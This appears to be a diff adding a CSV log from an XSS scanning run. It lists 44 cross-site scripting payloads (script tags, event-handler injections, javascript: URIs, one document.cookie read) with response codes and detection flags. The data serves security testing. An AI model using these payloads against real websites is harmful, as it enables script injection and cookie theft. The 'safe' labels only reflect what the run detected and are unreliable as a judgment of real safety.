@@ -1,0 +1,44 @@
+label,payload,response_code,alert_detected,error_detected,body_word_count_changed,timestamp
+malicious,"""><script>alert(1)</script>",200,True,False,False,1747390596.0161302
+malicious,'><img src=x onerror=alert(1)>,200,True,True,True,1747390603.3411922
+suspicious,javascript:alert(1),200,False,False,True,1747390610.5786738
+suspicious,""" onmouseover=alert(1) x=""",200,False,False,True,1747390617.8176177
+suspicious,' onfocus=alert(1) autofocus ',200,False,False,True,1747390625.0293498
+malicious,<svg/onload=alert(1)>,200,True,False,True,1747390632.3177361
+suspicious,""" autofocus onfocus=alert(1) x=""",200,False,False,True,1747390639.5404518
+malicious,http://vulnerable.com/search?q=<script>alert(1)</script>,200,True,False,True,1747390646.8022397
+suspicious,""" onload=alert(1) """,200,False,False,True,1747390654.0032675
+malicious,'><iframe src=javascript:alert(1)>,200,True,False,True,1747390661.2582302
+malicious,"""><body onload=alert(1)>",200,True,False,True,1747390668.5149624
+safe,%22%3E%3Cscript%3Ealert(1)%3C/script%3E (URL-encoded),200,False,False,False,1747390675.7197156
+malicious,'><audio src=x onerror=alert(1)>,200,True,True,True,1747390682.974062
+malicious,"""><video><source onerror=alert(1)>",200,True,True,True,1747390690.2384386
+malicious,'><details open ontoggle=alert(1)>,200,True,False,True,1747390697.5353801
+suspicious,"""><marquee onstart=alert(1)>",200,False,False,True,1747390704.7755065
+suspicious,'><keygen autofocus onfocus=alert(1)>,200,False,False,True,1747390712.0117
+malicious,"""><style onload=alert(1)>",200,True,False,True,1747390719.2799509
+suspicious,'><template onload=alert(1)>,200,False,False,True,1747390726.5053315
+malicious,"""><embed src=javascript:alert(1)>",200,True,False,True,1747390733.764809
+malicious,<script>alert(document.cookie)</script>,200,True,False,True,1747390741.0204818
+malicious,<img src=x onerror=alert(1)>,200,True,True,True,1747390748.3186193
+malicious,<svg/onload=alert(1)>,200,True,False,True,1747390755.5679471
+malicious,<body onload=alert(1)>,200,True,False,False,1747390762.8198564
+malicious,"<iframe src=""javascript:alert(1)"">",200,True,False,True,1747390770.0777705
+suspicious,"<a href=""javascript:alert(1)"">Click</a>",200,False,False,True,1747390777.283368
+safe,<div onmouseover=alert(1)>Hover</div>,200,False,False,False,1747390784.5089285
+malicious,"<input type=""text"" onfocus=alert(1) autofocus>",200,True,False,True,1747390791.7631924
+malicious,<video><source onerror=alert(1)>,200,True,True,True,1747390799.0326514
+suspicious,<marquee onstart=alert(1)>,200,False,False,True,1747390806.2687647
+malicious,<details open ontoggle=alert(1)>,200,True,False,True,1747390813.5676868
+malicious,<script>alert(1)</script>,200,True,False,True,1747390820.936539
+malicious,<audio src=x onerror=alert(1)>,200,True,True,True,1747390828.1865199
+safe,<form onsubmit=alert(1)><input type=submit>,200,False,False,False,1747390835.3769615
+safe,<keygen autofocus onfocus=alert(1)>,200,False,False,False,1747390842.5770078
+suspicious,<select onchange=alert(1)><option>1<option>2</select>,200,False,False,True,1747390849.7977111
+malicious,<style onload=alert(1)>,200,True,False,True,1747390857.0328417
+malicious,<script>alert(0)</script>,200,True,False,True,1747390864.2727242
+malicious,"<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",200,True,False,True,1747390871.6024995
+malicious,<embed src=javascript:alert(1)>,200,True,False,True,1747390878.8208377
+safe,"<base href=""javascript:alert(1)//"">",200,False,False,False,1747390886.0203557
+suspicious,<template onload=alert(1)>,200,False,False,True,1747390893.236352
+suspicious,<script>alert(xss)</script>,200,False,False,True,1747390900.4493403
